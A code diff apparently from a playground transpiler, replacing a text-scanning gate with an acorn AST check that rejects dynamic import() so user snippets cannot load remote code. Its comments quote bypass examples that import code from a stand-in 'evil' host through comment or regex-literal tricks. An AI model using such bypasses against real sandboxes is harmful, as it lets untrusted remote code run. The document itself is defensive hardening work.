@@ -62,7 +62,7 @@ export async function transpile(
     const base = await transpileBase(code, opts);
     // Type/JSX erasure done — now erase & rebind ESM imports to the injected
     // scope (shared across every transpiler path, incl. the unit-test hatch).
-    return 'error' in base ? base : rebindModuleImports(base.js);
+    return 'error' in base ? base : await rebindModuleImports(base.js);
 }
 
 /** Erase TS + JSX only. Imports are handled downstream by rebindModuleImports. */
@@ -244,133 +244,104 @@ async function transpileWithBabel(code: string): Promise<TranspileResult> {
 const IMPORT_REGISTRY = '__stitchImport';
 
 /**
- * Return a copy of `src` with comment bodies and string/template-literal contents
- * replaced by same-length blanks, so a keyword scan (the dynamic-`import()` gate)
- * sees code structure only — never trivia or literal text.
- *
- * A single left-to-right pass tracks whether we are inside a line comment, block
- * comment, or a `'`/`"`/`` ` `` string, and blanks characters accordingly
- * (newlines are preserved so line/column stay meaningful). This is a lexical
- * approximation — deliberately conservative: it does NOT parse template
- * `${…}` substitutions (their contents are blanked too, which is safe for a
- * reject-only gate) and does NOT try to distinguish a regex literal from
- * division. That is acceptable because the ONLY consumer is a coarse "is there a
- * dynamic `import(` anywhere in real code" check; over-blanking a regex body can
- * at worst hide an `import(` that lived inside a regex literal, which is not
- * valid dynamic-import syntax anyway.
- *
- * Exported for the transpile smoke test (the comment-bypass regression asserts
- * the neutralizer collapses `import/**\/(` to a detectable `import(`).
+ * The message shown when a snippet reaches for a real module loader. Shared by the
+ * dynamic-`import()` rejection and the fail-closed "couldn't verify" path.
  */
-export function neutralizeCommentsAndStrings(src: string): string {
-    let out = '';
-    let i = 0;
-    const n = src.length;
-    type Mode = 'code' | 'line' | 'block' | 'squote' | 'dquote' | 'template';
-    let mode: Mode = 'code';
+const NO_DYNAMIC_IMPORT_MESSAGE =
+    "Dynamic import() isn't available in the playground. " +
+    "Everything from 'stitchapi' is already in scope; use a static " +
+    "`import { … } from 'stitchapi'` (or 'zod') instead.";
 
-    const blank = (ch: string): string => (ch === '\n' ? '\n' : ' ');
+/** Minimal shape of the acorn ESTree nodes we walk. */
+type AstNode = { type?: string; [key: string]: unknown };
 
-    while (i < n) {
-        const ch = src[i];
-        const next = i + 1 < n ? src[i + 1] : '';
+// Keys that never hold child AST nodes — skip them so the walk doesn't wander into
+// position metadata (`loc`/`range`/`start`/`end`) or the source of a `raw` literal.
+const NON_CHILD_KEYS = new Set(['type', 'start', 'end', 'loc', 'range', 'raw']);
 
-        if (mode === 'code') {
-            if (ch === '/' && next === '/') {
-                mode = 'line';
-                out += '  ';
-                i += 2;
-            } else if (ch === '/' && next === '*') {
-                mode = 'block';
-                out += '  ';
-                i += 2;
-            } else if (ch === "'") {
-                mode = 'squote';
-                out += ' ';
-                i += 1;
-            } else if (ch === '"') {
-                mode = 'dquote';
-                out += ' ';
-                i += 1;
-            } else if (ch === '`') {
-                mode = 'template';
-                out += ' ';
-                i += 1;
-            } else {
-                out += ch;
-                i += 1;
-            }
+/**
+ * True if the AST contains a dynamic `import(...)` — an ESTree `ImportExpression`
+ * node. Depth-first over every child node/array. `import.meta` is a `MetaProperty`
+ * and a `foo.import(x)` call is a `MemberExpression`, so neither is an
+ * `ImportExpression` and neither false-positives; a static `import … from …` is an
+ * `ImportDeclaration` (rewritten below), also not matched here.
+ */
+function astHasImportExpression(root: AstNode): boolean {
+    const stack: unknown[] = [root];
+    while (stack.length > 0) {
+        const node = stack.pop();
+        if (Array.isArray(node)) {
+            for (const child of node) stack.push(child);
             continue;
         }
-
-        if (mode === 'line') {
-            if (ch === '\n') {
-                mode = 'code';
-                out += '\n';
-            } else {
-                out += ' ';
-            }
-            i += 1;
-            continue;
+        if (!node || typeof node !== 'object') continue;
+        const n = node as AstNode;
+        if (n.type === 'ImportExpression') return true;
+        for (const key in n) {
+            if (NON_CHILD_KEYS.has(key)) continue;
+            const value = n[key];
+            if (value && typeof value === 'object') stack.push(value);
         }
-
-        if (mode === 'block') {
-            if (ch === '*' && next === '/') {
-                mode = 'code';
-                out += '  ';
-                i += 2;
-            } else {
-                out += blank(ch);
-                i += 1;
-            }
-            continue;
-        }
-
-        // String / template modes: blank contents, honor `\`-escapes, close on the
-        // matching quote (templates also close on backtick — `${}` is blanked too).
-        const quote = mode === 'squote' ? "'" : mode === 'dquote' ? '"' : '`';
-        if (ch === '\\') {
-            // Blank the backslash and the escaped char (keep newlines).
-            out += ' ';
-            if (next) out += blank(next);
-            i += 2;
-            continue;
-        }
-        if (ch === quote) {
-            mode = 'code';
-            out += ' ';
-            i += 1;
-            continue;
-        }
-        out += blank(ch);
-        i += 1;
     }
-
-    return out;
+    return false;
 }
 
-function rebindModuleImports(js: string): TranspileResult {
+function importError(message: string): TranspileResult {
+    return {
+        error: { name: 'UnsupportedImportError', message, phase: 'transpile' },
+    };
+}
+
+/**
+ * Reject a dynamic `import(...)` before the static-import rewrite runs — SEC-31/
+ * SEC-04: a surviving dynamic import reaches a REAL module loader in the Worker and
+ * loads remote code.
+ *
+ * Detection is AST-based (acorn), NOT a text scan. A lexical/regex gate over the
+ * transpiled source is defeated by trivia the scanner mis-reads: the prior
+ * comment/string-blanking lexer did not track regex literals, so a regex carrying
+ * an unbalanced quote — `const re = /'/; import('https://evil/m.js')` — desynced
+ * its string state and blanked the real `import(`, letting the escape through. An
+ * `ImportExpression` node cannot be hidden that way: comments, strings, template
+ * literals, and regex literals are all resolved by the parser.
+ *
+ * Returns a `{ error }` result to reject (a real dynamic import, or — fail-CLOSED —
+ * an anomalous acorn load/parse failure: this `js` is post-transpile output Sucrase
+ * already accepted, so if we cannot parse it we must not pass it through), else
+ * `undefined`. Never throws — `transpile()` is contractually no-throw (SEC-39b).
+ */
+async function rejectDynamicImport(
+    js: string,
+): Promise<TranspileResult | undefined> {
+    let hasDynamicImport: boolean;
+    try {
+        // Lazy-load, mirroring the transpilers (NFR1). acorn is a small, standalone
+        // ESTree parser — it only reads, never transforms.
+        const { parse } = await import('acorn');
+        const ast = parse(js, {
+            ecmaVersion: 'latest',
+            sourceType: 'module', // the js still carries static import/export
+            allowReturnOutsideFunction: true, // snippet body is wrapped later
+            allowAwaitOutsideFunction: true,
+        }) as unknown as AstNode;
+        hasDynamicImport = astHasImportExpression(ast);
+    } catch {
+        // Anomalous — Sucrase already validated this js. Fail closed.
+        return importError(NO_DYNAMIC_IMPORT_MESSAGE);
+    }
+    return hasDynamicImport
+        ? importError(NO_DYNAMIC_IMPORT_MESSAGE)
+        : undefined;
+}
+
+async function rebindModuleImports(js: string): Promise<TranspileResult> {
     // (1) Reject dynamic import() before the static rewrite strips `import`
-    // keywords. `import(` (not a `.import(` member) is always the dynamic form.
-    //
-    // We test a COMMENT- and STRING-NEUTRALIZED copy, not the raw `js`. Sucrase
-    // preserves comments, so a bare post-transpile regex with `\s*` between
-    // `import` and `(` is bypassable by wedging a comment in the gap
-    // (`import/**/('https://evil/m.js')` — SEC-31/SEC-04 escape). Neutralizing
-    // comments (and string/template bodies, so an `import(` inside a literal can't
-    // false-positive) makes the gate robust regardless of intervening trivia.
-    const scannable = neutralizeCommentsAndStrings(js);
-    if (/(^|[^.\w])import\s*\(/.test(scannable)) {
-        return {
-            error: {
-                name: 'UnsupportedImportError',
-                message:
-                    "Dynamic import() isn't available in the playground. " +
-                    "Everything from 'stitchapi' is already in scope; use a static " +
-                    "`import { … } from 'stitchapi'` (or 'zod') instead.",
-                phase: 'transpile',
-            },
-        };
+    // keywords — SEC-31/SEC-04. Detected from the acorn AST (rejectDynamicImport),
+    // so no text/regex trickery — a wedged comment, a string, or a quote-bearing
+    // regex literal — can hide the call from the gate.
+    const rejected = await rejectDynamicImport(js);
+    if (rejected) {
+        return rejected;
     }
 
     let out = js;
